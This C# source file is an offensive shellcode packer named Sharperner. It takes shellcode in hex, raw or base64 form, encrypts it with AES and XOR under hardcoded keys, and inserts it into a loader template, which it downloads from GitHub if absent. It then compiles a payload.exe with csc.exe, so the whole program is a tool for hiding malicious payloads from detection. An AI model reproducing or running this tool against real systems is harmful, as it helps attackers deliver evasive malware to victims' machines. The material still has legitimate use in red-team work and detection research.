using System;
using System.Net;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;

namespace Sharperner
{
    class Program
    {
        private static bool IsBase64String(string base64)
        {
            base64 = base64.Trim();
            return (base64.Length % 4 == 0) && Regex.IsMatch(base64, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        public static bool IsHex(String s)
        {
            string strHex = String.Concat("[0-9A-Fa-f]{", s.Length, "}");
            bool RetBoolHex = Regex.IsMatch(s, strHex);
            return RetBoolHex;
        }

        private static Random random = new Random();
        public static string RandomKey(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static byte[] xorEncDec(byte[] input, string theKeystring)
        {
            byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
            }
            return mixed;
        }

        public static bool isBinary(string path)
        {
            long length = new FileInfo(path).Length;
            if (length == 0) return false;

            using (StreamReader stream = new StreamReader(path))
            {
                int ch;
                while ((ch = stream.Read()) != -1)
                {
                    if (isControlChar(ch))
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        public static bool isControlChar(int ch)
        {
            return (ch > Chars.NUL && ch < Chars.BS)
                || (ch > Chars.CR && ch < Chars.SUB);
        }

        public static class Chars
        {
            public static char NUL = (char)0; // Null char
            public static char BS = (char)8; // Back Space
            public static char CR = (char)13; // Carriage Return
            public static char SUB = (char)26; // Substitute
        }

        //https://www.codeproject.com/Articles/5719/Simple-encrypting-and-decrypting-data-in-C
        //https://gist.github.com/RichardHan/0848a25d9466a21f1f38
        public static byte[] AESEncrypt(byte[] clearData, byte[] Key, byte[] IV)
        {
            MemoryStream ms = new MemoryStream();

            Rijndael alg = Rijndael.Create();

            alg.Key = Key;
            alg.IV = IV;

            CryptoStream cs = new CryptoStream(ms,
               alg.CreateEncryptor(), CryptoStreamMode.Write);

            // Write the data and make it do the encryption 
            cs.Write(clearData, 0, clearData.Length);

            cs.Close();

            byte[] encryptedData = ms.ToArray();

            return encryptedData;
        }

        //https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static void banner()
        {
            string banner = @"
███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ███████╗██████╗ ███╗   ██╗███████╗██████╗ 
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗
███████╗███████║███████║██████╔╝██████╔╝█████╗  ██████╔╝██╔██╗ ██║█████╗  ██████╔╝
╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝  ██╔══██╗
███████║██║  ██║██║  ██║██║  ██║██║     ███████╗██║  ██║██║ ╚████║███████╗██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  
by @ch4rm with <3
";
            Console.WriteLine(banner);
        }

        public static void help()
        {
            string help = @"
/file       B64 shellcode file
/key        XOR Key (Optional)
/out        Output file Location (Optional)

Example:
Sharperner.exe /file:file.txt
Sharperner.exe /file:file.txt /key:'l0v3151nth3a1ry000www' /out:payload.exe
";
            Console.WriteLine(help);
        }

        static void Main(string[] args)
        {
            string base64String = "";
            string xorKey = "Sup3rS3cur3K3yfTw!";
            string filePath;
            string outputFile = "";
            string xorAesEncStringB64 = "";
            byte[] rawshellcode = new byte[] { };
            byte[] aesEncByte = new byte[] { };
            byte[] key = new byte[32] { 0x81, 0x8a, 0xba, 0x08, 0xe0, 0xf0, 0x29, 0x7b, 0xe6, 0x6d, 0xf4, 0xa5, 0x66, 0x37, 0xec, 0x0e, 0x31, 0x8e, 0xa8, 0xae, 0x0e, 0x06, 0xa8, 0xab, 0x53, 0xcf, 0xcf, 0x99, 0x4a, 0xca, 0xc8, 0xc8 };
            byte[] iv = new byte[16] { 0x9d, 0xa8, 0xd3, 0xb1, 0xe2, 0xc9, 0x6b, 0xe9, 0x5d, 0x3a, 0x29, 0x04, 0xc1, 0x83, 0x57, 0x68 };

            banner();

            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var idx = argument.IndexOf(':');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                else
                    arguments[argument] = string.Empty;
            }

            if (arguments.Count == 0 || !arguments.ContainsKey("/file"))
            {
                Console.WriteLine("[!] Please Enter /file as argument");
                help();
            }
            else
            {
                filePath = arguments["/file"];

                if (!File.Exists(filePath)) //if file exists
                {
                    Console.WriteLine("[+] Missing input file");
                    Environment.Exit(0);
                }
                else
                {
                    try
                    {
                        if(IsHex(File.ReadAllText(filePath)))
                        {
                            Console.WriteLine("[+] Hex payload detected.");
                            rawshellcode = StringToByteArray(File.ReadAllText(filePath));
                            aesEncByte = AESEncrypt(rawshellcode, key, iv);
                        }
                        else if (isBinary(filePath))
                        {
                            Console.WriteLine("[+] Raw payload detected.");
                            rawshellcode = File.ReadAllBytes(filePath);
                            aesEncByte = AESEncrypt(rawshellcode, key, iv);
                        }
                        else if (IsBase64String(File.ReadAllText(filePath)))
                        {
                            Console.WriteLine("[+] Base64 input detected. Converting base64 to bytes");
                            base64String = File.ReadAllText(filePath);
                            rawshellcode = Convert.FromBase64String(base64String);
                            aesEncByte = AESEncrypt(rawshellcode, key, iv);
                        }
                        else
                        {
                            Console.WriteLine("[!] Couldn't detect file input content.");
                            Environment.Exit(0);
                        }

                        // XOR
                        byte[] xorAesEncByte = xorEncDec(aesEncByte, xorKey);

                        xorAesEncStringB64 = Convert.ToBase64String(xorAesEncByte);

                        Console.WriteLine("[+] Payload is now AES and XOR encrypted!");
                    }
                    catch
                    {
                        Console.WriteLine("[!] Error encrypting");
                    }

                }

                if (arguments.ContainsKey("/key"))
                {
                     xorKey = arguments["/key"];
                }
                else
                {
                    Console.WriteLine($"[+] No /key supplied. Using the default key: {xorKey}");
                }

                if(arguments.ContainsKey("/out"))
                {
                    outputFile = arguments["/out"];
                    if(!Path.GetExtension(outputFile).Contains(".exe"))
                    {
                        outputFile = $"{outputFile}.exe";
                    }
                }
                else
                {
                    outputFile = "payload.exe";
                }


                //Console.WriteLine($"XOR encrypted text: {xorAesEncStringB64}");

                //decrypt it back

                //byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xorAesEncStringB64), xorKey);

                //string sh3Llc0d3 = DecryptStringFromBytes(aesEncrypted, key, iv);

                //Console.WriteLine($"XOR decrypted text: {sh3Llc0d3}");

                // Write the file
                string fullPath = Path.Combine(Directory.GetCurrentDirectory(), "payload.dec");

                using (StreamWriter writer = new StreamWriter(fullPath))
                {
                    Console.WriteLine($"[+] Writing encoded base64 payload to {fullPath} just in case you need it");
                    writer.WriteLine(xorAesEncStringB64);
                }

                // Open template file
                var parentDir = Directory.GetParent(Directory.GetCurrentDirectory()).Parent.FullName;
                var templateFile = Path.Combine(parentDir, "templates/template.cs");
                var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");

                string templateFileContent = "";

                // read all content
                if (!File.Exists(templateFile)) //if file exists
                {
                    Console.WriteLine("[!] File does not exists in local, fetching online...");
                    ServicePointManager.Expect100Continue = true;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    WebClient client = new WebClient();
                    try
                    {
                        templateFileContent = client.DownloadString("https://raw.githubusercontent.com/aniqfakhrul/Sharperner/main/template.cs");
                    }
                    catch
                    {
                        Console.WriteLine("[!] No internet connection");
                        Environment.Exit(0);
                    }
                }
                else
                {
                    templateFileContent = File.ReadAllText(templateFile);
                }
                // replace "string xoredB64" line
                templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY",xorKey);
                // write all back into the file
                try
                {
                    Console.WriteLine("[+] Wrtiting shellcode to template file...");
                    File.WriteAllText(tempFile, templateFileContent);
                }
                catch (Exception err)
                {
                    Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
                }

                //compile the code
                string strCmd = $"/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{outputFile} {tempFile}";
                try
                {
                    System.Diagnostics.Process.Start("CMD.exe", strCmd);
                    Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                }
                catch (Exception err)
                {
                    Console.WriteLine($"[!] Error generating executable file with the following error {err.Message}");
                }

                Console.WriteLine($"[+] Doing some cleaning...");
                Thread.Sleep(1000);
                //File.Delete(tempFile);
            }

        }


    }

}
